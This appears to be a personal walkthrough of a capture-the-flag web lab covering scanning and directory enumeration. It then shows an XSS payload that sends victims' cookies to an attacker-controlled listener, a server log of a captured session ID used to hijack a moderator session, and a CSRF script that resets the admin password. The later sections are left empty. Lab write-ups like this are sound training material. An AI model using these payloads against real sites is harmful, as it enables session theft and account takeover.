#medium 

## 0. **Lab infos**

**Difficulty :** Medium
**Name :** Whats Your Name?
**IP** : 10.10.219.254
**Objectives :** Get the accessing the moderator account flag and the admin panel flag
**OS :** ?

##### **Conclusion**
**Time :** 1h51
	**Start :** 25.03.2025 18:55
	**Break at/to :** 25.03.2025 19:14 / 25.03.2025 20:04
	**Finish :** 25.03.2025 21:36
**Satisfaction :**  0/10 Nothing was working and I use medium but again nothing was working.
### 1. **Reconnaissance

First #nmap scan

```BASH
map -A -p- -v 10.10.219.254
```


Output :

```BASH
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
8081/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

It's a web app.

We will analyse the web app with #burpsuite 

On the port 80 we have this sitemap and we have the possibilitie to pre-register.
![[Pasted image 20250325190405.png]]

We can try to register.
One we register we have a login page but when we want to login it's say "User not verified" but we also have this :
![[Pasted image 20250325191031.png]]

But the subdomain doesn't work.

When we enter admin instead of Bobinette it's said "Invalid email or password".

We find some pages with #gobuster 

Output :

```BASH
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 1797]
/login.php            (Status: 200) [Size: 1785]
/register.php         (Status: 200) [Size: 2188]
/admin.php            (Status: 403) [Size: 0]
/upload.php           (Status: 403) [Size: 0]
/logout.php           (Status: 200) [Size: 154]
/mod.php              (Status: 403) [Size: 0]
/dashboard.php        (Status: 403) [Size: 0]
```



On the port 8081 we have nothin execpt a message who let know us that there is a login.php page.

![[Pasted image 20250325190550.png]]

We find some pages with #gobuster 

Output :

```BASH
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/index.php            (Status: 200) [Size: 70]
/login.php            (Status: 200) [Size: 3108]
/profile.php          (Status: 302) [Size: 0] [--> login.php]
/clear.php            (Status: 200) [Size: 4]
/admin.py             (Status: 200) [Size: 5537]
/assets               (Status: 301) [Size: 320] [--> http://worldwap.thm:8081/assets/]
/chat.php             (Status: 302) [Size: 0] [--> login.php]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/setup.php            (Status: 200) [Size: 149]
/block.php            (Status: 200) [Size: 15]
/logs.txt             (Status: 200) [Size: 0]
/phpmyadmin           (Status: 301) [Size: 324] [--> http://worldwap.thm:8081/phpmyadmin/]
/change_password.php  (Status: 302) [Size: 4] [--> login.php]
/server-status        (Status: 403) [Size: 279]
```

## 2. **Weaponization

```JS
<script>  
var img = new Image();  
img.src = 'http://10.10.235.199:4444/stealcookies?'+ document.cookie;  
</script>
```

## 3. **Delivery

![[Pasted image 20250325203616.png]]

We enter this payloads for see if we can steal a user cookie. With an #XSS

## 4. **Exploitation

With our exploit with the #XSS doesn't work.
But after a few second a PHPSESSID just appear.

```BASH
root@ip-10-10-235-199:~# python3 -m http.server 4444
Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...
10.10.53.234 - - [25/Mar/2025 19:38:03] code 404, message File not found
10.10.53.234 - - [25/Mar/2025 19:38:03] "GET /stealcookies?PHPSESSID=16qkgn0k0sehun9gjmsiiedthj HTTP/1.1" 404 -
```

And by changing ou PHPSESSID and go to `dashboard.php` it's show this :
![[Pasted image 20250325204238.png]]

On the port 8081 if we also change the PHPSESSID we can have the first flag :
![[Pasted image 20250325205110.png]]

```FLAG
ModP@wnEd
```


On the `chat.php` page we can send an #XSS and it's working. So we send the same payload and we got an PHPSESSID but it's change nothing. But we know one thing, i'ts the admin bot and he probabely open the message one day. So we send the payload of CSRF task7 to the bot :

```JS
<script>
        var xhr = new XMLHttpRequest();
        xhr.open('POST', "http" + "://login.worldwap.thm/change_password.php", true);
        xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                alert("Action executed!");
            }
        };
        xhr.send('action=execute&new_password=password123');
    </script>
```

So now we juste need to logout and log as admin with `admin:password123`
But I don't know why it's doesn't work. So I remember that we have a admin.py file. And It's was maybe an error of THM but there is the admin password:
![[Pasted image 20250325212939.png]]

After a lot of try nothing was working I don't know why...
## 5. **Installation

## 6. **Command and Control

## 7. **Actions on Objectives

...